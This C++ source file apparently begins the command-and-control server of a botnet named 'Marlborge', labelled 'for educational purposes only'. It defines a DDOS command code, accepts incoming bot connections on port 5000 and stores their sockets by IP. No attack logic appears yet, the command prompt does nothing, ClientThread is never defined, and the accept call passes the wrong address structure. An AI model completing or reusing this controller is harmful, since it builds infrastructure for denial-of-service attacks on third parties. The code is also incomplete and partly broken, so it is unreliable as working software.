#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include "Colors.h"
#include "Util.h"

#include <map>
#include <thread>
#include <mutex>

#define PORT 5000
#define MAX_CONN 2048

bool g_bQuit = false;

std::map<std::string, SOCKET> g_clients;
std::mutex g_clientsMutex;

enum COMMANDS {
	DDOS = 0x01
};

void ListenThread();
void ClientThread(SOCKET sock);
std::string GetClientIP(SOCKADDR_IN clientInfo);

int main() {
#ifdef WIN32
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

	std::cout << RED << R"(                                                              
,--.   ,--.               ,--.,--.                                
|   `.'   | ,--,--.,--.--.|  ||  |-.  ,---. ,--.--. ,---.  ,---.  
|  |'.'|  |' ,-.  ||  .--'|  || .-. '| .-. ||  .--'| .-. || .-. : 
|  |   |  |\ '-'  ||  |   |  || `-' |' '-' '|  |   ' '-' '\   --. 
`--'   `--' `--`--'`--'   `--' `---'  `---' `--'   .`-  /  `----' 
                                                   `---'          )" << std::endl;
	std::cout << BLUE << "Made for educational purposes only." << std::endl;
	std::cout << WHITE << "Version: " << GREEN << "Freshman (0.1)" << std::endl;
	std::cout << WHITE << "By: " << RED << "Preciado" << std::endl << std::endl;

	std::thread listenThread(ListenThread);
	listenThread.detach();

	while (!g_bQuit) {
		std::cout << WHITE << "preciado@marlborge:~$ ";

		std::string input;
		std::getline(std::cin, input);
	}

	return 0;
}

std::string GetClientIP(SOCKADDR_IN clientInfo) {
	char clientIp[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &clientInfo.sin_addr.s_addr, clientIp, INET_ADDRSTRLEN);

	return clientIp;
}

void ListenThread() {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	if (sock == INVALID_SOCKET) {
		std::cout << RED << "[ERROR] " << WHITE << "Error initializing our listen socket." << std::endl;
		return;
	}

	SOCKADDR_IN saIn = { };
	saIn.sin_family = AF_INET;
	saIn.sin_port = htons(PORT);
	
	inet_pton(AF_INET, "127.0.0.1", &saIn.sin_addr.s_addr);

	bind(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	listen(sock, MAX_CONN);

	while (true) {
		SOCKADDR_IN clientInfo = { };
		int nClientInfo = sizeof(clientInfo);
		SOCKET client = accept(sock, (SOCKADDR*)&saIn, &nClientInfo);
		if (client == INVALID_SOCKET)
			continue;

		std::string clientIp = GetClientIP(clientInfo);
		
		g_clientsMutex.lock();
		g_clients[clientIp] = client;
		g_clientsMutex.unlock();
	}
}